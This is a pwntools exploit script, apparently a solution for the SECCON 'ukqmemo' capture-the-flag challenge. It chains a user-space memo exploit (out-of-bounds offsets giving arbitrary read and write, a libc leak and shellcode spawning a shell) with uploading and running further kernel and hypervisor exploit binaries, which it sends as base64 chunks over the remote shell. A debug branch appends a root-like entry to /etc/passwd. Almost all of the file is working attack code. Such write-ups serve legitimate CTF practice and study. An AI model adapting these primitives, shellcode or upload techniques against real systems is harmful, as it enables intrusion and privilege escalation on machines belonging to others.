from pwn import *
HOST = 'localhost'
PORT = 6319

def start(dbgarg):
    if dbgarg=='':
        return remote(HOST, PORT)
    else:
        return process('./debug.sh')

def launch(r, dbgarg):
    r.sendlineafter(b'login: ', b'ctf')
    if dbgarg=="Duser":
        r.sendlineafter(b'~ #', b'/root/gdbserver :12121 memo /dev/tmp-memo')
        log.info('gdb ready')
    elif dbgarg=="Dkernel":
        r.sendlineafter(b'~ #', b'sysctl -w kernel.kptr_restrict=0')
        r.sendlineafter(b'~ #', b'cat /proc/kallsyms|grep chrdev_seek')
        r.recvuntil(b'chrdev_seek\r\n')
        devaddr = int(r.recvuntil(b't chrdev_seek', True), 16) - 0x4c0
        log.info(f'add-symbol-file kmemo.ko 0x{devaddr:x}')
        r.sendlineafter(b'~ #', b'cat /proc/kallsyms|grep chrdev_read')
        r.recvuntil(b'chrdev_read\r\n')
        check = int(r.recvuntil(b't chrdev_read', True), 16)
        r.sendlineafter(b'~ #', b'echo ctf2:x:1337:1337::/:/bin/sh >> /etc/passwd')
        r.sendlineafter(b'~ #', b'su ctf2')
        log.info('waiting for attach')
        pause()
    return r

def exploit_umemo(r):
    # helper functions for pwning umemo
    def switch_fixed():
        r.sendlineafter(b'\n> ', b'1')

    def switch_freespace():
        r.sendlineafter(b'\n> ', b'2')

    def read_fixed(idx):
        r.sendlineafter(b'\nM> ', b'1')
        r.sendlineafter(b': ', str(idx).encode())

    def write_fixed(idx, data):
        r.sendlineafter(b'\nM> ', b'2')
        r.sendlineafter(b': ', str(idx).encode())
        r.sendafter(b': ', data)

    def back():
        r.sendlineafter(b'> ', b'0')

    def read_freespace(offset, size):
        r.sendlineafter(b'\nS> ', b'1')
        r.sendlineafter(b': ', str(offset).encode())
        r.sendlineafter(b': ', str(size).encode())

    def write_freespace(offset, size, data):
        r.sendlineafter(b'\nS> ', b'2')
        r.sendlineafter(b': ', str(offset).encode())
        r.sendlineafter(b': ', str(size).encode())
        r.sendafter(b': ', data)

    switch_fixed()
    write_fixed(0, b'AAAABBBB\x04')
    back()
    switch_freespace()
    read_freespace(0x3fffeff8, 0x400)
    r.recvuntil(b'Output: ')
    binleak = b''
    while len(binleak) < 0x10:
        binleak += r.recv(1)
    leak = u64(binleak[8:])
    #print(f'leak: 0x{leak:x}')
    dev = leak - 0x100
    back()

    libc_ptr = dev + 0x1110

    def aar(where):
        switch_freespace()
        payload = b''
        payload += b'a'*(0x8)
        payload += flat(where)
        if b'\x7f' in payload:
            payload = payload.split(b'\x7f')[0]
            payload += b'\x04'
        else:
            payload += b'\x0a'

        write_freespace(0x3fffeff8, len(payload)-1, payload)
        back()
        switch_fixed()
        read_fixed(0)

        r.recvuntil(b'Output: ')
        binleak = b''
        while len(binleak) < 8:
            binleak += r.recv(1)
        back()
        return u64(binleak)

    def aaw(where, what):
        switch_freespace()
        payload = b''
        payload += b'a'*(0x8)
        payload += flat(where)
        if b'\x7f' in payload:
            payload = payload.split(b'\x7f')[0]
            payload += b'\x04'
        else:
            payload += b'\x0a'

        write_freespace(0x3fffeff8, len(payload), payload)
        back()
        switch_fixed()
        if b'\x7f' in what:
            what = what.split(b'\x7f')[0]
        write_fixed(0, what)
        back()

    base = aar(libc_ptr)
    leak = aar(base + 0x185160)
    target = leak - 0x128
    payload = b''
    payload += p64(target+8)
    payload = payload.split(b'\x7f')[0]+b'\x04'
    aaw(target, payload)

    payload = b''
    payload += asm('''
        nop
        push rsp
        pop rsi
        xor edi, edi
        mov dl, 0x7a
        syscall
    ''')
    aaw(target+8, asm(shellcraft.sh())+b'\x04')
    back()

def upload_exploit(r, filename, prompt="$ ", block_len=128, target_dir="/tmp", bin_name="exp"):
    PROMPT = prompt.encode()
    BLOCK_LEN = block_len
    r.sendlineafter(PROMPT, f'cd {target_dir}'.encode())
    with open(filename, 'rb') as f:
        to_up = f.read()
    to_up_enc = b64e(to_up)

    p = log.progress('sending exploit ... ')
    for i in range(0, len(to_up_enc), BLOCK_LEN):
        r.sendlineafter(PROMPT, f'echo {to_up_enc[i:i+BLOCK_LEN]} | base64 -d >> ./{bin_name}'.encode())
        p.status(f'{i} / {len(to_up_enc)}')    
    p.success('done.')    

def exploit_kmemo(r):
    prompt = "$ "
    upload_exploit(r, "./kmemo/exp", prompt=prompt, bin_name = "exp")
    r.sendlineafter(prompt.encode(), b'chmod +x ./exp')
    r.sendlineafter(prompt.encode(), b'./exp')

def exploit_qmemo(r):
    prompt = "# "
    upload_exploit(r, "./qmemo/exp", prompt = prompt, bin_name = "exp2")
    r.sendlineafter(prompt.encode(), b'chmod +x ./exp2')
    r.sendlineafter(prompt.encode(), b'./exp2')

if __name__ == '__main__':
    #context.log_level = 'debug'
    context.arch = 'amd64'
    context.terminal = ['tmux', 'split-window', '-h']

    if args.D:
        dbgarg = 'D'
    elif args.K:
        dbgarg = 'K'
    else:
        dbgarg = ''

    #HOST = 'ukqmemo.seccon.games'

    r = start(dbgarg)
    p = log.progress('launth and login ...')
    launch(r, dbgarg)
    p.success('done.')

    p = log.progress('pwning umemo ...')
    exploit_umemo(r)
    p.success('done.')

    p = log.progress('pwning kmemo ...')
    exploit_kmemo(r)
    p.success('done.')

    p = log.progress('pwning qmemo ...')
    exploit_qmemo(r)
    p.success('done.')
    context.log_level = 'debug'

    r.interactive()
    r.close()
